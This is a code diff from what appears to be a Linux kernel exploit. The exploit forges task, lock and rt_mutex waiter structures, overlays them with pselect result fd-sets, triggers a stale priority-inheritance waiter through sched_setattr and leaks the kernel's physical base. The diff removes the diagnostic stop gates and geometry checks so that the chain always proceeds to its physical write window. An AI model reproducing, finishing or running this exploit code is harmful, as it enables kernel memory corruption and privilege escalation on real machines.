@@ -10,48 +10,14 @@
 #ifndef SLIDE_PSELECT_RESULT_ROUTE
 #define SLIDE_PSELECT_RESULT_ROUTE 0
 #endif
-#if SLIDE_PSELECT_RESULT_ROUTE && \
-    defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
-#error "SLIDE_PSELECT_RESULT_ROUTE triggers after pselect returns"
+#if SLIDE_PSELECT_RESULT_ROUTE && defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
+#error "result fd-set route runs after pselect returns"
 #endif
-#if SLIDE_PSELECT_RESULT_ROUTE && \
-    (!defined(LEGACY_RT_MUTEX_WAITER) || !LEGACY_RT_MUTEX_WAITER)
-#error "SLIDE_PSELECT_RESULT_ROUTE requires the legacy 0x50-byte waiter"
+#if SLIDE_PSELECT_RESULT_ROUTE && (!defined(LEGACY_RT_MUTEX_WAITER) || !LEGACY_RT_MUTEX_WAITER)
+#error "result fd-set route requires the legacy 0x50-byte waiter"
 #endif
 #if SLIDE_PSELECT_RESULT_ROUTE && SLIDE_PSELECT_WORD_SHIFT != 1
-#error "SLIDE_PSELECT_RESULT_ROUTE requires word shift 1"
-#endif
-#if defined(APP_SLIDE_PRETRIGGER_GEOMETRY_DIAGNOSTIC) && \
-    APP_SLIDE_PRETRIGGER_GEOMETRY_DIAGNOSTIC && \
-    (!defined(APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED) || \
-     !APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED) && \
-    (!defined(APP_SLIDE_DIAGNOSTIC_STOP_AFTER_SCHED) || \
-     !APP_SLIDE_DIAGNOSTIC_STOP_AFTER_SCHED) && \
-    (!defined(APP_SLIDE_P0_ORACLE_DIAGNOSTIC) || \
-     !APP_SLIDE_P0_ORACLE_DIAGNOSTIC)
-#error "pretrigger geometry diagnostic requires a diagnostic stop gate"
-#endif
-#if defined(APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED) && \
-    APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED && \
-    defined(APP_SLIDE_DIAGNOSTIC_STOP_AFTER_SCHED) && \
-    APP_SLIDE_DIAGNOSTIC_STOP_AFTER_SCHED
-#error "select exactly one sched_setattr diagnostic stop gate"
-#endif
-#if defined(APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED) && \
-    APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED && !SLIDE_PSELECT_RESULT_ROUTE
-#error "stop-before-sched diagnostic requires the pselect result route"
-#endif
-#if defined(APP_SLIDE_DIAGNOSTIC_STOP_AFTER_SCHED) && \
-    APP_SLIDE_DIAGNOSTIC_STOP_AFTER_SCHED && !SLIDE_PSELECT_RESULT_ROUTE
-#error "stop-after-sched diagnostic requires the pselect result route"
-#endif
-#if defined(APP_SLIDE_P0_ORACLE_DIAGNOSTIC) && \
-    APP_SLIDE_P0_ORACLE_DIAGNOSTIC && \
-    ((!defined(APP_SLIDE_DIAGNOSTIC_ONLY) || \
-      !APP_SLIDE_DIAGNOSTIC_ONLY) || \
-     !SLIDE_PSELECT_RESULT_ROUTE || \
-     (!defined(SLIDE_PSELECT_NULL_TIMEOUT) || !SLIDE_PSELECT_NULL_TIMEOUT))
-#error "P0 oracle diagnostic requires result route, null timeout, and diagnostic-only stop"
+#error "result fd-set route requires word shift 1"
 #endif
 #define SLIDE_WAIT_NSEC 50000000L
 #define SLIDE_REQUEUE_MAX_POLLS 1000
@@ -352,61 +318,6 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   }
 }
 
-#if defined(APP_SLIDE_PRETRIGGER_GEOMETRY_DIAGNOSTIC) && \
-    APP_SLIDE_PRETRIGGER_GEOMETRY_DIAGNOSTIC
-static int slide_direct_range_ok(uintptr_t address, size_t size) {
-  return address >= DIRECT_MAP_BASE && address < DIRECT_MAP_END &&
-         size <= DIRECT_MAP_END - address;
-}
-
-static int slide_log_pretrigger_geometry(size_t slot) {
-  fd_set in;
-  fd_set out;
-  fd_set ex;
-  prepare_slide_pselect_fdsets(&in, &out, &ex);
-  int words_per_set = slide_pselect_words_per_set();
-  const uint64_t expected[] = {
-    slide_oracle_parent, 0, slide_oracle_target,
-    slide_oracle_parent, 0, slide_oracle_target,
-    fake_task, fake_lock, FAKE_WAITER_PRIO, 0,
-  };
-  int words_ok = 1;
-  for (size_t index = 0; index < sizeof(expected) / sizeof(expected[0]);
-       index++) {
-    int global_word = slide_pselect_global_word((int)index);
-    uint64_t actual = slide_pselect_get_global_word(
-        &in, &out, &ex, words_per_set, global_word);
-    int match = actual == expected[index];
-    words_ok &= match;
-    pr_info("p0 pretrigger waiter word=%zu global=%d actual=%016llx "
-            "expected=%016llx match=%d\n",
-            index, global_word, (unsigned long long)actual,
-            (unsigned long long)expected[index], match);
-  }
-
-  int page_ok = slide_direct_range_ok(page_base, ORDER3_SIZE);
-  int task_ok = slide_direct_range_ok(
-      fake_task, FAKE_TASK_PI_BLOCKED_ON_OFF + sizeof(uint64_t));
-  int lock_ok = slide_direct_range_ok(
-      fake_lock, (fake_w0 - fake_lock) + FAKE_WAITER_LAYOUT_SIZE);
-  int parent_ok = slide_oracle_parent >= VMEMMAP_START &&
-                  slide_oracle_parent < VMEMMAP_END;
-  int target_ok = slide_direct_range_ok(
-      slide_oracle_target, sizeof(uint64_t));
-  pr_info("p0 pretrigger geometry slot=%zu page=%016zx task=%016zx "
-          "pi_lock=%016zx lock=%016zx waiter=%016zx parent=%016zx "
-          "target=%016zx\n",
-          slot, page_base, fake_task, fake_task + FAKE_TASK_PI_LOCK_OFF,
-          fake_lock, fake_w0, slide_oracle_parent, slide_oracle_target);
-  pr_info("p0 pretrigger priorities stack_waiter=%d page_waiter=%d\n",
-          FAKE_WAITER_PRIO, SLIDE_FAKE_WAITER_PRIO);
-  pr_info("p0 pretrigger range page=%d task=%d lock_waiter=%d parent=%d "
-          "target=%d words=%d\n",
-          page_ok, task_ok, lock_ok, parent_ok, target_ok, words_ok);
-  return page_ok && task_ok && lock_ok && parent_ok && target_ok && words_ok;
-}
-#endif
-
 void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
   for (int fd = 0; fd < slide_pselect_nfds; fd++) {
     if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
@@ -521,10 +432,9 @@ void slide_pselect_stack_copy(void) {
       memcmp(&ex, &expected_ex, sizeof(ex)) == 0;
   if (result_ready) {
     /*
-     * core_sys_select has already materialized the selected descriptor masks
-     * in its result fd-sets. On legacy targets those result words overlap
-     * the stale waiter. Do not enter the kernel again on this thread before
-     * the consumer has issued sched_setattr against it.
+     * core_sys_select copied all ten legacy waiter qwords into its result
+     * fd-sets. Keep this thread out of the kernel while the consumer changes
+     * its priority and follows the stale PI waiter.
      */
     atomic_store(&slide_consume_go, 1);
     for (size_t spins = 0;
@@ -582,14 +492,8 @@ void slide_pselect_stack_copy(void) {
           atomic_load(&slide_consume_last_sched_ret),
           atomic_load(&slide_consume_last_sched_errno));
 #endif
-#if defined(APP_SLIDE_DIAGNOSTIC_STOP_AFTER_SCHED) && \
-    APP_SLIDE_DIAGNOSTIC_STOP_AFTER_SCHED
-  pr_warning("p0 post-sched diagnostic stop; physical write window suppressed\n");
-  atomic_store(&slide_pselect_write_window, 0);
-#else
   atomic_store(&slide_pselect_write_window,
                ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);
-#endif
 
   close(high_read);
   if (block_fd != pipefd[0]) {
@@ -683,10 +587,7 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   pin_to_core(CONSUMER_CORE);
   atomic_store(&slide_consumer_ready, 1);
-#if !defined(APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED) || \
-    !APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED
   int *errno_ptr = &errno;
-#endif
 
   int seen = 0;
   for (;;) {
@@ -784,14 +685,6 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     int tid = atomic_load(&slide_waiter_tid);
 #endif
 
-#if defined(APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED) && \
-    APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED
-    pr_warning("p0 pretrigger diagnostic stop tid=%d seq=%d; "
-               "result fdsets matched, sched_setattr not entered\n",
-               tid, seq);
-    atomic_store(&slide_consume_stop, 1);
-    return NULL;
-#else
     int calls = atomic_load(&slide_consume_calls);
     int entered = atomic_load(&slide_consume_enter_sched) + 1;
     atomic_store(&slide_consume_enter_sched, entered);
@@ -812,18 +705,11 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
       int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
       atomic_store(&slide_consume_sched_ok, sched_ok);
     }
-#if defined(APP_SLIDE_DIAGNOSTIC_STOP_AFTER_SCHED) && \
-    APP_SLIDE_DIAGNOSTIC_STOP_AFTER_SCHED
-    pr_warning("p0 post-sched diagnostic syscall tid=%d seq=%d "
-               "ret=%ld errno=%d; no additional trigger armed\n",
-               tid, seq, ret, saved_errno);
-#endif
     atomic_store(&slide_consume_stop, 1);
     while (atomic_load(&slide_consume_go)) {
       __asm__ volatile("yield" ::: "memory");
     }
     return NULL;
-#endif
   }
 }
 
@@ -1096,14 +982,6 @@ static int slide_trigger_physical_slot(size_t slot) {
     return 0;
   }
 
-#if defined(APP_SLIDE_PRETRIGGER_GEOMETRY_DIAGNOSTIC) && \
-    APP_SLIDE_PRETRIGGER_GEOMETRY_DIAGNOSTIC
-  if (!slide_log_pretrigger_geometry(slot)) {
-    pr_error("p0 pretrigger geometry rejected slot=%zu\n", slot);
-    return 0;
-  }
-#endif
-
   int base_delay = (int)slide_enter_delay_usec();
 #if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
   int attempts = (int)(sizeof(slide_physical_slot_delays) /
@@ -1251,8 +1129,6 @@ static int slide_leak_physical_base(void) {
     pr_error("p0 physical pipe preparation failed\n");
     return 0;
   }
-  pr_info("p0 diagnostic stage=kernel-page-prepare-enter "
-          "pipe_base=%016zx\n", pipebuf_page_base);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #ifdef APP_SLIDE_FRESH_PAGE_ATTEMPTS
   const int fresh_page_attempts = APP_SLIDE_FRESH_PAGE_ATTEMPTS;
@@ -1290,13 +1166,6 @@ static int slide_leak_physical_base(void) {
             fresh_page_attempts, page_base);
     pr_info("p0 fresh page attempt=%d/%d base=%016zx\n",
             fresh_attempt, fresh_page_attempts, page_base);
-#if defined(APP_SLIDE_DIAGNOSTIC_STOP_AFTER_PREPARE) && \
-    APP_SLIDE_DIAGNOSTIC_STOP_AFTER_PREPARE
-    pr_warning("p0 page-prepare diagnostic stop base=%016zx; "
-               "rt_mutex trigger not entered\n",
-               page_base);
-    return 0;
-#endif
     if (!page_base) {
 #ifndef APP_SLIDE_KERNEL_PAGE_SEARCH_BATCHES
       fresh_attempt++;
@@ -1371,13 +1240,6 @@ static int slide_leak_physical_base(void) {
   return 0;
 #else
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
-#if defined(APP_SLIDE_DIAGNOSTIC_STOP_AFTER_PREPARE) && \
-    APP_SLIDE_DIAGNOSTIC_STOP_AFTER_PREPARE
-  pr_warning("p0 page-prepare diagnostic stop base=%016zx; "
-             "rt_mutex trigger not entered\n",
-             page_base);
-  return 0;
-#endif
   if (!page_base) {
     return 0;
   }
